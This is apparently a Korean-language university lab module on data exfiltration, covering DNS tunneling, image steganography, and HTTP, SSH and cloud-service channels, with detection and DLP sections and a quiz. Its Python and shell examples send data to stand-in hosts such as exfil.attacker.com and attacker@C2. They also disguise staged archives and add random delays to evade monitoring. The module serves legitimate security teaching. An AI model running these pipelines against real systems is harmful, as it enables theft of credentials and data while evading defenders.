# Week 10: 데이터 유출 — DNS exfil, 스테가노그래피, 암호화 채널

## 학습 목표
- **데이터 유출(Exfiltration)**의 개념과 APT 공격에서의 역할을 이해한다
- **DNS 기반 데이터 유출** 기법의 원리를 이해하고 구현할 수 있다
- **스테가노그래피**를 이용하여 이미지, 오디오 등에 데이터를 은닉할 수 있다
- **암호화 채널**(HTTPS, SSH, 커스텀 프로토콜)을 통한 데이터 유출 기법을 실습할 수 있다
- **대역폭 제한 환경**에서의 데이터 유출 전략(압축, 분할, 우선순위)을 설계할 수 있다
- 데이터 유출 탐지 기법(DLP, 네트워크 이상 탐지)을 이해하고 대응할 수 있다
- MITRE ATT&CK Exfiltration 전술의 세부 기법을 매핑할 수 있다

## 전제 조건
- DNS 프로토콜과 HTTP/HTTPS의 동작 원리를 이해하고 있어야 한다
- C2 통신(Week 07)의 기본 개념을 알고 있어야 한다
- base64 인코딩과 기본 암호화 개념을 이해하고 있어야 한다
- Python 파일 I/O와 네트워크 프로그래밍 기초를 할 수 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 수신 서버 (공격자) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS (탐지) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 유출 대상 (피해 서버) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | 데이터 유출 이론 + 채널 분류 | 강의 |
| 0:35-1:10 | DNS 데이터 유출 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 스테가노그래피 실습 | 실습 |
| 1:55-2:30 | 암호화 채널 + HTTP 유출 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | DLP 탐지 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 데이터 유출 이론 (35분)

## 1.1 데이터 유출 개요

데이터 유출은 킬체인의 최종 단계(Actions on Objectives)에서 **탈취한 데이터를 조직 외부로 반출**하는 행위이다.

### 유출 채널 분류

| 채널 | 프로토콜 | 대역폭 | 은닉성 | 탐지 난이도 | ATT&CK |
|------|---------|--------|--------|-----------|--------|
| HTTP/HTTPS | 443/80 | 높음 | 높음 | 중간 | T1048.002 |
| DNS | 53 | 낮음 | 매우 높음 | 높음 | T1048.003 |
| ICMP | - | 낮음 | 높음 | 높음 | T1048 |
| 이메일 | 25/587 | 중간 | 중간 | 중간 | T1048.002 |
| 클라우드 | 443 | 높음 | 매우 높음 | 매우 높음 | T1567 |
| 물리 매체 | USB | 무제한 | - | 물리 보안 | T1052 |
| 블루투스 | - | 낮음 | 높음 | 높음 | T1011 |

### MITRE ATT&CK Exfiltration 전술

| 기법 ID | 이름 | 설명 | 이번 주 실습 |
|---------|------|------|:---:|
| T1048 | Exfiltration Over Alternative Protocol | 대체 프로토콜 유출 | ✓ |
| T1048.002 | Exfiltration Over Asymmetric Encrypted Non-C2 | 암호화 채널 | ✓ |
| T1048.003 | Exfiltration Over Unencrypted Non-C2 | DNS 등 평문 | ✓ |
| T1041 | Exfiltration Over C2 Channel | C2 채널 통해 유출 | ✓ |
| T1567 | Exfiltration Over Web Service | 클라우드 서비스 | △ |
| T1567.002 | Exfiltration to Cloud Storage | S3, GDrive 등 | △ |
| T1029 | Scheduled Transfer | 예약 전송 | ✓ |
| T1030 | Data Transfer Size Limits | 크기 제한 분할 | ✓ |
| T1052 | Exfiltration Over Physical Medium | USB 등 | △ |
| T1537 | Transfer Data to Cloud Account | 클라우드 계정 | △ |

## 1.2 데이터 유출 전 준비

| 단계 | 행위 | 도구 | ATT&CK |
|------|------|------|--------|
| 수집 | 민감 데이터 식별/수집 | find, grep | T1005 |
| 압축 | 크기 축소 (gzip, 7z) | tar, 7zip | T1560 |
| 암호화 | AES/GPG 암호화 | openssl, gpg | T1560.001 |
| 분할 | 탐지 회피를 위한 분할 | split | T1030 |
| 스테이징 | 임시 저장소에 모아둠 | /tmp, %TEMP% | T1074 |
| 유출 | 외부로 전송 | curl, dns, scp | T1048 |

---

# Part 2: DNS 데이터 유출 (35분)

## 2.1 DNS Exfiltration 원리

DNS 데이터 유출은 DNS 쿼리의 **서브도메인에 데이터를 인코딩**하여 전송한다.

```
[유출할 데이터]
password=admin123

[base64 인코딩]
cGFzc3dvcmQ9YWRtaW4xMjM=

[DNS 쿼리로 변환]
nslookup cGFzc3dvcmQ9YWRtaW4xMjM.exfil.attacker.com
                                    ↑ DNS 서버에 기록됨
```

## 실습 2.1: DNS 데이터 유출 구현

> **실습 목적**: DNS 쿼리를 이용하여 민감 데이터를 서브도메인에 인코딩하고 유출하는 기법을 구현한다
>
> **배우는 것**: 데이터 인코딩, DNS 쿼리 분할, 재조립의 전 과정을 배운다
>
> **결과 해석**: DNS 서버 로그에서 인코딩된 데이터를 재조립하여 원본 데이터를 복원할 수 있으면 성공이다
>
> **실전 활용**: 모든 아웃바운드 트래픽이 차단된 환경에서도 DNS는 허용되므로 유출에 활용한다
>
> **명령어 해설**: base64 인코딩 후 63자 단위로 분할하여 DNS 쿼리를 생성한다
>
> **트러블슈팅**: DNS 쿼리 실패 시 resolv.conf의 네임서버 설정을 확인한다

```bash
# DNS 데이터 유출 시뮬레이션
python3 << 'PYEOF'
import base64
import subprocess
import time

print("=== DNS 데이터 유출 시뮬레이션 ===")
print()

# 유출할 데이터
secret_data = """
DB_HOST=10.20.30.100
DB_USER=admin
DB_PASS=SuperSecret123!
API_KEY=sk-proj-abcdef1234567890
"""

DOMAIN = "exfil.attacker.com"
MAX_LABEL = 60  # DNS 라벨 최대 길이 (여유분)

# 1. 인코딩
encoded = base64.b64encode(secret_data.encode()).decode()
dns_safe = encoded.replace('+', '-').replace('/', '_').replace('=', '')

# 2. 분할
chunks = [dns_safe[i:i+MAX_LABEL] for i in range(0, len(dns_safe), MAX_LABEL)]

print(f"[1] 원본 데이터: {len(secret_data)} 바이트")
print(f"[2] 인코딩 후: {len(encoded)} 바이트")
print(f"[3] DNS 쿼리 수: {len(chunks)}개")
print()

# 3. DNS 쿼리 생성 (실제 전송하지 않음)
print("[4] 생성된 DNS 쿼리:")
for i, chunk in enumerate(chunks):
    query = f"{chunk}.{i}.{DOMAIN}"
    print(f"  dig TXT {query}")

print()

# 4. 수신 측 재조립
print("[5] 수신 측 재조립:")
reassembled = ''.join(chunks)
reassembled = reassembled.replace('-', '+').replace('_', '/')
padding = 4 - len(reassembled) % 4
if padding != 4:
    reassembled += '=' * padding
decoded = base64.b64decode(reassembled).decode()
print(f"  복원된 데이터:\n{decoded}")

# 5. 실제 DNS 쿼리 테스트 (로컬 DNS, 외부 전송 안 함)
print("[6] 로컬 DNS 쿼리 테스트:")
for i, chunk in enumerate(chunks[:2]):  # 2개만 테스트
    query = f"{chunk}.{i}.test.local"
    print(f"  쿼리: {query[:50]}...")
PYEOF
```

---

# Part 3: 스테가노그래피 (35분)

## 3.1 스테가노그래피 원리

스테가노그래피는 **데이터를 다른 미디어(이미지, 오디오 등)에 숨기는** 기법이다. 암호화는 데이터를 읽을 수 없게 하지만, 스테가노그래피는 데이터의 **존재 자체를 숨긴다**.

### 이미지 스테가노그래피 기법

| 기법 | 원리 | 용량 | 탐지 난이도 |
|------|------|------|-----------|
| **LSB 치환** | 픽셀의 최하위 비트 변경 | 이미지 크기의 ~12.5% | 중간 |
| **DCT 계수** | JPEG 주파수 계수 변경 | 낮음 | 높음 |
| **메타데이터** | EXIF, Comment 필드 | 제한적 | 낮음 |
| **EOF 부착** | 파일 끝 뒤에 데이터 추가 | 무제한 | 낮음 |
| **파일 형식 악용** | PNG chunks, ZIP 결합 | 다양 | 중간 |

## 실습 3.1: 이미지 스테가노그래피 구현

> **실습 목적**: 이미지 파일에 비밀 데이터를 숨기고 추출하는 기법을 구현한다
>
> **배우는 것**: LSB 치환의 원리, EOF 부착 기법, 스테가노그래피 탐지 방법을 배운다
>
> **결과 해석**: 스테고 이미지에서 숨겨진 데이터를 정확히 복원할 수 있으면 성공이다
>
> **실전 활용**: DLP가 텍스트 패턴을 감시하는 환경에서 이미지로 위장하여 데이터를 유출한다
>
> **명령어 해설**: Python PIL/struct로 이미지 데이터를 조작하여 비트 단위로 정보를 삽입한다
>
> **트러블슈팅**: PIL이 없으면 pip install Pillow로 설치한다

```bash
# 스테가노그래피 시뮬레이션
python3 << 'PYEOF'
import base64
import os

print("=== 스테가노그래피 시뮬레이션 ===")
print()

# 기법 1: EOF 부착 (가장 간단한 방법)
print("[기법 1] EOF 부착")
print("  원리: 이미지 파일의 EOF 마커 뒤에 데이터를 추가")
print("  PNG: IEND 청크 뒤에 데이터")
print("  JPEG: FFD9 마커 뒤에 데이터")
print()

# 시뮬레이션: 가짜 이미지 + 비밀 데이터
fake_image = b'\x89PNG\r\n\x1a\n' + b'\x00' * 100 + b'IEND'  # 최소 PNG 구조
secret = b"SECRET: admin:P@ssw0rd123"
stego_image = fake_image + b'\x00HIDDEN\x00' + secret

print(f"  원본 이미지: {len(fake_image)} 바이트")
print(f"  스테고 이미지: {len(stego_image)} 바이트")
print(f"  숨긴 데이터: {len(secret)} 바이트")
print(f"  크기 증가: {len(stego_image) - len(fake_image)} 바이트")
print()

# 추출
marker = stego_image.find(b'\x00HIDDEN\x00')
if marker != -1:
    extracted = stego_image[marker + len(b'\x00HIDDEN\x00'):]
    print(f"  추출된 데이터: {extracted.decode()}")
print()

# 기법 2: LSB 치환 원리
print("[기법 2] LSB (Least Significant Bit) 치환")
print("  원리: 각 픽셀의 최하위 비트를 비밀 데이터 비트로 교체")
print()

# 예시: 3개 픽셀(R,G,B)에 1바이트(8비트) 숨기기
pixels = [
    (0b10110100, 0b01101010, 0b11001100),  # 원본 픽셀 1
    (0b11010010, 0b10100110, 0b01110100),  # 원본 픽셀 2
    (0b10001100, 0b11001010, 0b10110010),  # 원본 픽셀 3
]

secret_byte = ord('A')  # 0b01000001
bits = [(secret_byte >> i) & 1 for i in range(7, -1, -1)]

print(f"  숨길 문자: 'A' = {bin(secret_byte)} = {bits}")
print()

bit_idx = 0
new_pixels = []
for r, g, b in pixels:
    nr = (r & 0xFE) | bits[bit_idx] if bit_idx < 8 else r
    bit_idx += 1
    ng = (g & 0xFE) | bits[bit_idx] if bit_idx < 8 else g
    bit_idx += 1
    nb = (b & 0xFE) | bits[bit_idx] if bit_idx < 8 else b
    bit_idx += 1
    new_pixels.append((nr, ng, nb))

for i, (orig, new) in enumerate(zip(pixels, new_pixels)):
    print(f"  픽셀 {i+1}: {orig} → {new}")
    print(f"    변화: R={abs(orig[0]-new[0])}, G={abs(orig[1]-new[1])}, B={abs(orig[2]-new[2])}")

print()
print("  LSB 변경은 시각적으로 감지할 수 없음 (1/256 변화)")

print()
print("=== 스테가노그래피 도구 ===")
print("  steghide: JPEG/BMP에 데이터 삽입 (비밀번호 보호)")
print("  stegsolve: 스테가노그래피 분석/탐지")
print("  zsteg: PNG/BMP LSB 스테가노그래피 탐지")
print("  binwalk: 파일 내부 숨겨진 데이터 탐색")
PYEOF
```

---

# Part 4: 암호화 채널 유출과 탐지 (35분)

## 4.1 암호화 채널을 통한 데이터 유출

### HTTP/HTTPS 유출

```bash
# 가장 일반적인 유출 방법
# POST 요청으로 데이터 전송
curl -X POST https://attacker.com/collect \
  -H "Content-Type: application/octet-stream" \
  --data-binary @secret_file.tar.gz.enc

# 클라우드 서비스 악용
curl -X PUT "https://storage.googleapis.com/bucket/data" \
  -H "Authorization: Bearer TOKEN" \
  --data-binary @data.enc
```

## 실습 4.1: HTTP 기반 데이터 유출

> **실습 목적**: HTTP를 통해 민감 데이터를 수집, 압축, 암호화, 유출하는 전체 과정을 실습한다
>
> **배우는 것**: 데이터 수집→압축→암호화→분할→전송의 유출 파이프라인을 배운다
>
> **결과 해석**: 수신 서버에서 원본 데이터를 복원할 수 있으면 유출 파이프라인이 성공한 것이다
>
> **실전 활용**: 실제 APT의 데이터 유출 파이프라인과 동일한 방식이다
>
> **명령어 해설**: tar로 압축, openssl로 암호화, curl로 전송하는 파이프라인이다
>
> **트러블슈팅**: 대용량 파일은 split으로 분할하여 크기 제한을 우회한다

```bash
# HTTP 데이터 유출 파이프라인
echo "=== HTTP 데이터 유출 파이프라인 ==="

# 1. 수집 대상 생성 (교육용)
mkdir -p /tmp/exfil_demo
echo "DB_HOST=10.20.30.100" > /tmp/exfil_demo/config.env
echo "DB_PASS=SuperSecret123!" >> /tmp/exfil_demo/config.env
echo "사용자 목록: admin, john, jane" > /tmp/exfil_demo/users.txt
echo "금융 데이터 (시뮬레이션)" > /tmp/exfil_demo/financial.csv

echo "[1] 수집 대상"
ls -la /tmp/exfil_demo/

# 2. 압축
echo ""
echo "[2] 압축"
tar czf /tmp/exfil_demo.tar.gz -C /tmp/exfil_demo . 2>/dev/null
ls -la /tmp/exfil_demo.tar.gz

# 3. 암호화
echo ""
echo "[3] 암호화 (AES-256-CBC)"
openssl enc -aes-256-cbc -salt -pbkdf2 \
  -in /tmp/exfil_demo.tar.gz \
  -out /tmp/exfil_demo.enc \
  -pass pass:ExfilKey2025! 2>/dev/null
ls -la /tmp/exfil_demo.enc

# 4. 분할 (교육용: 작은 크기로 분할)
echo ""
echo "[4] 분할"
split -b 50 /tmp/exfil_demo.enc /tmp/exfil_chunk_
ls -la /tmp/exfil_chunk_*

# 5. 전송 시뮬레이션
echo ""
echo "[5] 전송 (HTTP POST)"
# 수신 서버 시뮬레이션
mkdir -p /tmp/exfil_recv
cd /tmp/exfil_recv && python3 -m http.server 8877 &
RECV_PID=$!
sleep 1

for chunk in /tmp/exfil_chunk_*; do
  NAME=$(basename "$chunk")
  echo "  전송: $NAME ($(wc -c < "$chunk") 바이트)"
  # 실제: curl -X POST http://attacker:8877/ --data-binary @"$chunk"
done

# 6. 수신 측 복원
echo ""
echo "[6] 수신 측 복원"
cat /tmp/exfil_chunk_* > /tmp/exfil_restored.enc
openssl enc -aes-256-cbc -d -salt -pbkdf2 \
  -in /tmp/exfil_restored.enc \
  -out /tmp/exfil_restored.tar.gz \
  -pass pass:ExfilKey2025! 2>/dev/null
tar xzf /tmp/exfil_restored.tar.gz -C /tmp/exfil_recv/ 2>/dev/null
echo "  복원된 파일:"
cat /tmp/exfil_recv/config.env 2>/dev/null

# 정리
kill $RECV_PID 2>/dev/null
rm -rf /tmp/exfil_demo /tmp/exfil_demo.tar.gz /tmp/exfil_demo.enc /tmp/exfil_chunk_* /tmp/exfil_restored* /tmp/exfil_recv
echo ""
echo "[유출 파이프라인 완료]"
```

## 실습 4.2: 데이터 유출 탐지

> **실습 목적**: 네트워크와 호스트에서 데이터 유출 시도를 탐지하는 방법을 배운다
>
> **배우는 것**: DNS 이상 탐지, HTTP 대용량 전송 탐지, DLP 규칙 설정을 배운다
>
> **결과 해석**: 비정상 DNS 패턴, 대용량 아웃바운드 트래픽이 탐지되면 유출 의심이다
>
> **실전 활용**: Blue Team이 데이터 유출을 실시간 탐지하고 차단하는 데 활용한다
>
> **명령어 해설**: 네트워크 트래픽 통계와 로그 분석으로 유출 패턴을 식별한다
>
> **트러블슈팅**: 암호화된 유출은 메타데이터(크기, 빈도, 목적지)로 탐지한다

```bash
echo "=== 데이터 유출 탐지 기법 ==="

echo ""
echo "[1] DNS 유출 탐지 지표"
echo "  - 비정상적으로 긴 서브도메인 (>30자)"
echo "  - 단일 도메인에 대한 과도한 TXT 쿼리"
echo "  - 존재하지 않는 도메인에 대한 반복 쿼리"
echo "  - DNS 쿼리 크기의 갑작스러운 증가"

echo ""
echo "[2] HTTP 유출 탐지 지표"
echo "  - 비정상 시간대의 대용량 POST 요청"
echo "  - 알 수 없는 외부 IP로의 대량 데이터 전송"
echo "  - Content-Type: application/octet-stream 빈번 사용"
echo "  - 클라우드 스토리지 API 호출 (S3, GCS)"

echo ""
echo "[3] 네트워크 트래픽 분석"
echo "--- 아웃바운드 연결 통계 ---"
ss -tn state established 2>/dev/null | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10

echo ""
echo "[4] Suricata 유출 관련 알림"
sshpass -p1 ssh secu@10.20.30.1 \
  "grep -i 'exfil\|dns.*tunnel\|data.*transfer' /var/log/suricata/fast.log 2>/dev/null | tail -5 || echo '  관련 알림 없음'" 2>/dev/null

echo ""
echo "=== DLP(Data Loss Prevention) 전략 ==="
echo "  1. 콘텐츠 검사: 신용카드, 주민번호 패턴 탐지"
echo "  2. 네트워크 DLP: 아웃바운드 트래픽 필터링"
echo "  3. 엔드포인트 DLP: USB, 프린터, 클라우드 업로드 제어"
echo "  4. DNS 모니터링: 비정상 DNS 패턴 탐지"
echo "  5. CASB: 클라우드 서비스 사용 감시"
```

## 실습 4.3: SSH 기반 은밀한 데이터 유출

> **실습 목적**: SSH/SCP를 이용하여 암호화된 채널로 데이터를 유출하는 기법을 실습한다
>
> **배우는 것**: scp, sftp, SSH 터널을 이용한 데이터 전송과 탐지 회피 기법을 배운다
>
> **결과 해석**: 데이터가 암호화된 채널을 통해 전송되고 IDS에 탐지되지 않으면 성공이다
>
> **실전 활용**: SSH가 허용된 환경에서 가장 은밀하고 빠른 유출 방법이다
>
> **명령어 해설**: scp는 SSH 프로토콜을 통한 파일 전송, tar+ssh는 스트림 전송이다
>
> **트러블슈팅**: SSH가 차단되면 DNS나 ICMP 유출로 전환한다

```bash
# SSH 기반 유출 시뮬레이션
echo "=== SSH 기반 은밀한 데이터 유출 ==="

# 유출 대상 데이터 생성
mkdir -p /tmp/exfil_ssh_demo
echo "SELECT * FROM users WHERE role='admin';" > /tmp/exfil_ssh_demo/query.sql
echo "admin:hash123:admin@corp.com" > /tmp/exfil_ssh_demo/credentials.txt
echo "10.20.30.0/24 네트워크 토폴로지" > /tmp/exfil_ssh_demo/network_map.txt

echo ""
echo "[방법 1] SCP 직접 전송"
echo "  scp -C /path/to/data.tar.gz attacker@C2:/exfil/"
echo "  -C 옵션으로 압축 전송 (대역폭 절약)"

echo ""
echo "[방법 2] tar + SSH 스트림 (파일 생성 없이 전송)"
echo "  tar czf - /sensitive/data/ | ssh attacker@C2 'cat > exfil.tar.gz'"
echo "  → 로컬에 아카이브 파일을 생성하지 않음 (안티포렌식)"

echo ""
echo "[방법 3] SSH 터널 통한 간접 전송"
echo "  ssh -L 8443:external-storage:443 pivot@internal"
echo "  curl -X PUT https://localhost:8443/upload --data-binary @data.enc"
echo "  → 내부에서 외부 저장소에 직접 접근 불가 시 피봇 사용"

echo ""
echo "[방법 4] 점진적 유출 (Low and Slow)"
echo "  for file in /sensitive/*.doc; do"
echo '    scp "$file" attacker@C2:/exfil/'
echo "    sleep \$((RANDOM % 300 + 60))  # 1~5분 랜덤 지연"
echo "  done"
echo "  → 트래픽 이상 탐지를 회피하기 위한 랜덤 지연"

echo ""
echo "[실습] web 서버에서 opsclaw으로 파일 유출 시뮬레이션"
# web → opsclaw으로 데이터 전송
sshpass -p1 ssh web@10.20.30.80 "
  echo 'sensitive data from web server' > /tmp/exfil_test.txt
  echo '[유출] web → opsclaw 전송 시뮬레이션'
  cat /tmp/exfil_test.txt
  rm -f /tmp/exfil_test.txt
" 2>/dev/null

# 정리
rm -rf /tmp/exfil_ssh_demo
echo "[SSH 유출 시뮬레이션 완료]"
```

## 실습 4.4: 클라우드 서비스를 이용한 유출 시뮬레이션

> **실습 목적**: 합법적 클라우드 서비스를 악용한 데이터 유출 기법을 이해한다
>
> **배우는 것**: 클라우드 스토리지, 웹메일, 협업 도구를 이용한 유출과 탐지 방법을 배운다
>
> **결과 해석**: 정상 트래픽으로 위장된 유출이 DLP에 탐지되지 않으면 우회 성공이다
>
> **실전 활용**: 현대 APT는 클라우드 서비스를 주요 유출 채널로 사용한다
>
> **명령어 해설**: curl로 클라우드 API를 호출하여 데이터를 업로드한다
>
> **트러블슈팅**: 클라우드 서비스 차단 시 대안 채널(DNS, ICMP)로 전환한다

```bash
# 클라우드 유출 시뮬레이션
echo "=== 클라우드 서비스 유출 기법 ==="
echo ""

cat << 'CLOUD_EXFIL'
[1] AWS S3 직접 업로드
  aws s3 cp secret.tar.gz.enc s3://attacker-bucket/ --no-sign-request
  → 공개 쓰기 가능 버킷 활용

[2] Google Drive API
  curl -X POST "https://www.googleapis.com/upload/drive/v3/files?uploadType=media" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/octet-stream" \
    --data-binary @secret.enc

[3] Pastebin/GitHub Gist
  curl -X POST https://api.github.com/gists \
    -H "Authorization: token TOKEN" \
    -d '{"files":{"data.txt":{"content":"base64_encoded_data"}}}'

[4] Discord Webhook (최근 APT 트렌드)
  curl -X POST "https://discord.com/api/webhooks/ID/TOKEN" \
    -F "file=@secret.enc"

[5] Telegram Bot API
  curl -F document=@secret.enc \
    "https://api.telegram.org/botTOKEN/sendDocument?chat_id=CHATID"

탐지 방법:
  - CASB(Cloud Access Security Broker)로 클라우드 사용 감시
  - SSL/TLS 복호화로 업로드 내용 검사
  - DLP 규칙에 클라우드 API 엔드포인트 추가
  - 대용량 아웃바운드 HTTPS 트래픽 모니터링
CLOUD_EXFIL

echo ""
echo "[실습] 대역폭 기반 탐지 시뮬레이션"
echo "--- 정상 트래픽 패턴 ---"
echo "  일반 브라우징: 10~500KB/요청, 불규칙"
echo "  이메일: 50~5000KB, 업무 시간대"
echo ""
echo "--- 유출 트래픽 패턴 ---"
echo "  대용량 POST: 10MB+, 야간 시간대"
echo "  반복 업로드: 동일 목적지, 일정 간격"
echo "  암호화 데이터: 높은 엔트로피"
echo ""
echo "[탐지 규칙 예시]"
echo "  if (destination == cloud_storage) and (upload_size > 10MB) and (time == after_hours):"
echo "    alert('Potential data exfiltration via cloud storage')"
```

## 실습 4.5: 종합 데이터 유출 시나리오

> **실습 목적**: 수집→스테이징→압축→암호화→분할→다중 채널 유출의 전체 파이프라인을 종합 실행한다
>
> **배우는 것**: 실제 APT가 사용하는 다중 채널 유출 전략과 실시간 탐지 대응을 배운다
>
> **결과 해석**: 다중 채널을 통한 유출이 완료되고 수신 측에서 재조립이 성공하면 완료이다
>
> **실전 활용**: APT 인시던트 대응 시 유출 경로를 역추적하는 데 필수적인 지식이다
>
> **명령어 해설**: 여러 유출 채널을 조합하여 단일 채널 차단에 대비한다
>
> **트러블슈팅**: 특정 채널이 차단되면 폴백 채널로 자동 전환하는 로직을 구현한다

```bash
echo "============================================================"
echo "       종합 데이터 유출 시나리오                               "
echo "============================================================"

echo ""
echo "[Phase 1] 데이터 수집"
echo "  대상: web 서버의 설정 파일, 로그, 데이터베이스"
sshpass -p1 ssh web@10.20.30.80 "
  echo '수집 가능 데이터:'
  echo '  - /etc/passwd: '$(wc -l < /etc/passwd 2>/dev/null || echo 'N/A')' 줄'
  echo '  - SSH 설정: '$(ls -la /etc/ssh/sshd_config 2>/dev/null | awk '{print \$5}')' 바이트'
  echo '  - 웹 로그: '$(wc -l < /var/log/apache2/access.log 2>/dev/null || echo 'N/A')' 줄'
" 2>/dev/null

echo ""
echo "[Phase 2] 스테이징 + 압축 + 암호화"
echo "  tar czf /tmp/.cache.dat /etc/passwd /etc/ssh/ 2>/dev/null"
echo "  openssl enc -aes-256-cbc -salt -pbkdf2 -in /tmp/.cache.dat -out /tmp/.update.tmp"
echo "  → 파일명을 정상 캐시/업데이트 파일로 위장"

echo ""
echo "[Phase 3] 다중 채널 유출"
echo "  채널 1 (주): SSH/SCP (빠르고 안정적)"
echo "  채널 2 (보조): HTTPS POST (클라우드 위장)"
echo "  채널 3 (비상): DNS (거의 차단되지 않음)"
echo ""
echo "  전략: 1차 시도 → SSH, 실패 시 → HTTPS, 모두 차단 → DNS"

echo ""
echo "[Phase 4] 방어 모니터링"
sshpass -p1 ssh secu@10.20.30.1 \
  "echo '--- Suricata 최근 알림 ---'; tail -5 /var/log/suricata/fast.log 2>/dev/null || echo 'N/A'" 2>/dev/null

sshpass -p1 ssh siem@10.20.30.100 \
  "echo '--- Wazuh 파일 무결성 ---'; grep -i 'integrity\|syscheck' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 | python3 -c '
import sys,json
for l in sys.stdin:
    try:
        d=json.loads(l); print(f\"  {d.get(\\\"rule\\\",{}).get(\\\"description\\\",\\\"?\\\")[:60]}\")
    except: pass' 2>/dev/null || echo '  FIM 알림 없음'" 2>/dev/null

echo ""
echo "============================================================"
echo "  유출 시나리오 완료 — 방어 로그와 대조 분석하라              "
echo "============================================================"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | DNS 유출 인코딩 | Python | 서브도메인 인코딩 |
| 2 | DNS 유출 분할 | 쿼리 생성 | 다중 쿼리 생성 |
| 3 | 스테가노그래피 EOF | Python | 데이터 숨기기/추출 |
| 4 | LSB 원리 | 비트 조작 | 픽셀 변화 최소 |
| 5 | 유출 파이프라인 | tar+openssl+curl | 전체 과정 실행 |
| 6 | 암호화 유출 | openssl enc | AES-256 암호화 |
| 7 | 분할 전송 | split | 청크 생성 |
| 8 | 수신 복원 | 역순 실행 | 원본 데이터 복원 |
| 9 | 탐지 기법 | 로그 분석 | 이상 패턴 식별 |
| 10 | DLP 전략 | 설계 | 5가지 이상 대책 |

---

## 자가 점검 퀴즈

**Q1.** DNS 데이터 유출에서 서브도메인 길이 제한(63자)을 극복하는 방법은?

<details><summary>정답</summary>
데이터를 63자 이하의 청크로 분할하고, 각 청크를 별도의 DNS 쿼리로 전송한다. 쿼리에 시퀀스 번호를 포함하여 수신 측에서 올바른 순서로 재조립한다. 예: chunk1.0.exfil.com, chunk2.1.exfil.com
</details>

**Q2.** 스테가노그래피와 암호화의 차이점은?

<details><summary>정답</summary>
암호화는 데이터를 읽을 수 없게 변환하지만 암호화된 데이터의 존재는 드러난다. 스테가노그래피는 데이터의 존재 자체를 숨긴다(이미지, 오디오 등에 은닉). 최고의 보안은 둘을 결합하는 것이다: 먼저 암호화한 후 스테가노그래피로 숨긴다.
</details>

**Q3.** LSB 스테가노그래피가 시각적으로 감지되지 않는 이유는?

<details><summary>정답</summary>
LSB(최하위 비트)를 변경하면 픽셀 값이 최대 1만 변한다(예: 255→254). 인간의 눈은 256단계 중 1단계 차이를 감지할 수 없다. 8비트 컬러에서 LSB 변경은 0.39%의 변화이며, 이는 시각적으로 무의미하다.
</details>

**Q4.** 데이터 유출 전 압축과 암호화를 수행하는 이유는?

<details><summary>정답</summary>
압축: 전송량을 줄여 유출 시간을 단축하고, DLP의 크기 기반 탐지를 회피한다. 암호화: 네트워크 모니터링에서 데이터 내용을 분석할 수 없게 하고, DLP의 콘텐츠 패턴 매칭을 무력화한다.
</details>

**Q5.** HTTPS를 통한 데이터 유출이 탐지하기 어려운 이유는?

<details><summary>정답</summary>
HTTPS는 TLS로 암호화되어 페이로드 내용을 분석할 수 없다. 정상적인 웹 브라우징과 유출 트래픽이 동일한 포트(443)를 사용하므로 포트 기반 필터링이 불가하다. TLS 복호화(MITM) 없이는 메타데이터(크기, 빈도, 목적지)로만 탐지해야 한다.
</details>

**Q6.** DNS 데이터 유출을 탐지하는 효과적인 방법 3가지는?

<details><summary>정답</summary>
1. 서브도메인 엔트로피 분석: base64 인코딩된 데이터는 높은 엔트로피를 가짐
2. 쿼리 빈도/크기 기준선: 정상 대비 비정상적으로 높은 DNS 쿼리 빈도 탐지
3. 신규 도메인 모니터링: 최근 등록된 도메인에 대한 대량 쿼리 탐지
</details>

**Q7.** 클라우드 서비스(S3, Google Drive)를 유출 채널로 사용하는 장점은?

<details><summary>정답</summary>
1. 합법적 서비스이므로 방화벽에서 차단하기 어려움
2. HTTPS 사용으로 내용 분석 불가
3. 대역폭이 높아 대용량 데이터 유출 가능
4. 다수의 직원이 사용하므로 정상 트래픽에 혼합됨
</details>

**Q8.** 데이터 유출 시 분할 전송(T1030)의 전략적 의미는?

<details><summary>정답</summary>
1. DLP의 크기 기반 탐지를 회피 (각 청크가 임계값 미만)
2. 전송 실패 시 해당 청크만 재전송 가능
3. 시간 분산: 장기간에 걸쳐 소량씩 유출하면 트래픽 이상 탐지 회피
4. 다중 채널 사용: 각 청크를 다른 경로로 전송 가능
</details>

**Q9.** steghide와 binwalk 도구의 차이점은?

<details><summary>정답</summary>
steghide는 스테가노그래피 도구로 이미지/오디오에 데이터를 삽입하고 추출한다(공격 도구). binwalk는 파일 내부에 숨겨진 데이터, 파일시스템, 압축 아카이브를 탐색하는 분석 도구이다(탐지/포렌식 도구). steghide로 숨긴 데이터를 binwalk로 발견할 수 있다.
</details>

**Q10.** 실습 환경에서 가장 은닉성 높은 데이터 유출 경로는?

<details><summary>정답</summary>
SSH 터널(포트 22) 통한 암호화 전송이 가장 은닉성이 높다. 이유: 1) SSH는 정상적으로 사용되는 프로토콜, 2) 전체 페이로드가 암호화, 3) scp/sftp는 정상 파일 전송과 구별 불가. DNS 유출은 은닉성은 높지만 대역폭이 제한적이다.
</details>

---

## 과제

### 과제 1: 유출 파이프라인 자동화 (개인)
수집→압축→암호화→분할→DNS/HTTP 유출→수신→재조립→복호화를 자동으로 수행하는 Python 스크립트를 작성하라.

### 과제 2: 스테가노그래피 탐지 보고서 (팀)
LSB, EOF, 메타데이터 등 다양한 스테가노그래피 기법에 대한 탐지 방법을 조사하고, 각 기법의 탐지 도구와 정확도를 비교하는 보고서를 작성하라.

### 과제 3: DLP 정책 설계 (팀)
